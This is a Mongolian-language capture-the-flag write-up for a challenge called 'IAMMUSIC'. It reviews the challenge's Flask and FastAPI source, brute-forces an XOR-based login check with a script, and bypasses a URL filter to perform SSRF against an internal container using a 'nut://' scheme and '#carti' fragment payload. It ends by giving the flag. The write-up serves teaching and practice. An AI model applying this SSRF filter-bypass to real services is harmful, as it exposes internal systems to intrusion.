
# IAMMUSIC

## **Хүндрэл:** Hard 


## **Бодолт**  
Уг бодлого нь <b> i_am_music , terminal </b> гэх 2 контайнераас бүрдэнэ.


### **1. i_am_music container**  
```python
from flask import Flask
from os import environ
app =  Flask(__name__)
FLAG = environ.get("FLAG",  "flag{test_flag_for_cool_boys}")
@app.route("/i_am_music")
def  top_secret():
	return FLAG

if __name__ ==  '__main__':
app.run(host='0.0.0.0',  port=3493)
```
Уг контайнерийн <b>secret.py</b>-ийн  <b>/i_am_music </b> path руу ямар нэгэн байдлаар хандаж чадвал flag-ийг авна. Гэвч ийшээ хандахын тулд дотоод сүлжээгээр л хандах боломжтой бөгөөд public хандалт байхгүйг <b>docker-compose.yml</b> -аас харж болно

### **2. Docker-compose.yml**  
Хамгийн сүүлд байх 
```yml
services:
  terminal:
    build:
      context: ./terminal
    ports:
      - 8282:8282
    restart: on-failure
    command: uvicorn main:app --host 0.0.0.0 --port 8282
    environment:
      LOGIN_SECRET_KEY: "1_4@m_mU5ic"
      SESSION_SECRET_KEY: "test"
    networks: 
      default_net:
    deploy:
      resources:
        limits:
          cpus: '1'
          memory: 4G
  
  i_am_music_panel:
    build:
      context: ./i_am_music
    restart: on-failure
    command: python ./secret.py
    environment:
      FLAG: "nest{test}"
    networks: 
      default_net:
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 2G

networks:
  default_net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.30.0.0/16
          gateway: 172.30.0.1
```

Эндээс бидэнд <b> LOGIN_SECRET_KEY </b> өгсөнийг анзаарч болох ба цаашид хэрэг болно. <b>Networks</b> хэсэгт 2 контайнер нэг дотоод сүлжээнд байгаагаар ассан байна. Мөн <b>terminal</b> руу гаднаас хандалт хийж болохоор тохируулагдсан байна. 
### **3. Terminal**  
main.py -д хамгийн эхэнд login хийх хэрэгтэй ба <b>/login</b>  endpoint-ийг ашиглана.
```python
NEED_USERNAME =  "PlayboiCartIAMMUSIC"
NEED_PASSWORD =  "Opium123"
@app.post("/login")
async  def  login(request: Request,  username: str =  Form(...),  password: str =  Form(...)):
	if  (validate(username, LOGIN_SECRET_KEY)  -  validate(password, LOGIN_SECRET_KEY))  ==  5  and NEED_USERNAME in username and NEED_PASSWORD in password:
	request.session["auth"]  =  True
	return  RedirectResponse(url="/terminal",  status_code=303)
	else:
return  JSONResponse({"message":"Try harder, Opium!"})
```
Нэвтрэхийн тулд :
1. username нь "PlayboiCartIAMMUSIC", password нь  "Opium123" string үүдийг агуулах ёстой. Жишээ нь: username "PlayboiCartiIAMMUSIC123" байж болно гол нь "PlayboiCartiIAMMUSIC" гэсэн хэсгээ агуулах ёстой.
2. username , password утгууд validate функцээс ирсэн утгуудын зөрүү нь 5тай тэнцүү байх ёстой.
<br>validate function:
```python
def  validate(value: str,  key: str):
result =  0
for i, c in  enumerate(value):
	result ^=  ord(c)  ^  ord(key[i % len(key)])
	return result
```
Validate функц 2 string-ийн үсэг бүрээр гүйж ascii утгуудыг хооронд XOR үйлдэл хийж эцэст нь ASCII утгыг буцааж байна. Эндээс зөрүү нь 5 гарах username, password утгуудаа bruteforce - дож болохоор харагдаж байна. 
bruteforce script:

```python
import string

alp = """0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~ """
LOGIN_SECRET_KEY = '1_4@m_mU5ic'

def validate(value: str, key: str):
    result = 0
    for i, c in enumerate(value):
        result ^= ord(c) ^ ord(key[i % len(key)])
    return result  # Fixed indentation here

NEED_USERNAME = "PlayboiCartIAMMUSIC"
NEED_PASSWORD = "Opium123"

base_usernames = [NEED_USERNAME + c for c in alp]
base_passwords = [NEED_PASSWORD + c for c in alp]

for u in base_usernames:
    for p in base_passwords:
        res_u = validate(u, LOGIN_SECRET_KEY)
        res_p = validate(p, LOGIN_SECRET_KEY)
        if res_u - res_p == 5:
            print(f"[+] Match found!")
            print(f"[*] Username: {u}")
            print(f"[*] Password: {p}")
            print(f"[DEBUG] XOR username: {res_u}, password: {res_p}")
```
Үр дүнд нь цөөнгүй боломжууд гарч ирсэн ба эндээс нэгийг нь ашиглая:
```
+] Match found!
[*] Username: PlayboiCartIAMMUSIC~
[*] Password: Opium123T
[DEBUG] XOR username: 20, password: 15
```
ng tiim zurag

### **4. SSRF**
Нэвтэрсэний дараа <b>/terminal</b>  endpoint ашиглаж байна.
```python
@app.post("/terminal")
async  def  process_address(request: Request,  address: str =  Form(...)):
	if  not request.session.get("auth"):
		raise  HTTPException(status_code=403,  detail="nah. u arent opium!")
valid_addr, err =  check_address(address)
	if  not err:
		try:
			async  with httpx.AsyncClient(follow_redirects=False)  as client:
				response =  await client.get(valid_addr)
		if response.status_code ==  200:
			content = response.text
		else:
			content =  "Omg! Opium is not 'Opium'ing"
		except httpx.RequestError:
			content =  "That's bad :("
	else:
		content = err
return templates.TemplateResponse("terminal.html",  {"request":request,  "content": content})
```
Дээрх кодын хийж буй үйлдэл нь:
1.Хэрэглэгчээс URL авч тухайн URL руу хүсэлт явуулна.
2.check_address функцээс ямар нэгэн алдаа ирээгүй тохиолдолд тухайн веб URL руу хандана.
Эндээс бид зөвхөн дотоод сүлжээнээс хандах <b>i_am_music</b> контайнер руу хандах боломжтой гэдгийг анзаарч болно.
validate function:
```python
def check_address(address: str):
    parsed_addr = urlparse(address)
    
    parsed_addr = parsed_addr._replace(query="")
    if not "carti" in parsed_addr.geturl():
        return None, "Only carti addresses allowed!"
    if parsed_addr.port:
        return None, "No explicit ports allowed!"
    
    parsed_scheme = parsed_addr.scheme
    port = getservbyname(parsed_scheme)
    
    if port == 443:
        parsed_addr = parsed_addr._replace(scheme="https")
    else:
        parsed_addr = parsed_addr._replace(scheme="http")
        
    clean_addr = f"{parsed_addr.scheme}://{parsed_addr.netloc}:{port}{parsed_addr.path}"

    if len(clean_addr) > 33:
        return None, "Too long didn't read lol -_-"
        
    return clean_addr, None
```
 Уг функцийн нөхцөл:
 1."carti" string агуулсан байх ёстой
 2.Өөрөө port бичихгүй default port ашиглана. Жишээ нь : http://aa.com байвал 80 гэж үзнэ . ssh байвал 22 гэж үзнэ. http://aa:8000.com байвал үүнийг алдаа гэж үзнэ.
 3.URL-ийн урт 33 давахгүй.
 
### **4. Final payload**
172.30.0.2 хаягийн 3493 порт руу хандаж чадвал flag авна.
3493 нь NUT протоколын default дугаар бөгөөд үүнийг ашиглан payload үүсгэнэ.
```
nut://172.30.0.2/i_am_music
```
Дээрх payload хэдийгээр зөв ч "carti" гэх утгыг агуулах ёстой.  '#' араас залгасан утга хаяганд нөлөөлөхгүй тул доорх payload-ийг ашиглаж болно.
```
nut://172.30.0.2/i_am_music#carti
```
Дараах URL-ийг terminal-д оруулсанаар дотоод сүлжээнд байгаа контейнороос flag авч чадна .
## **Туг:**  
    nest{is_IAMMUSIC_MID_or_MEH??}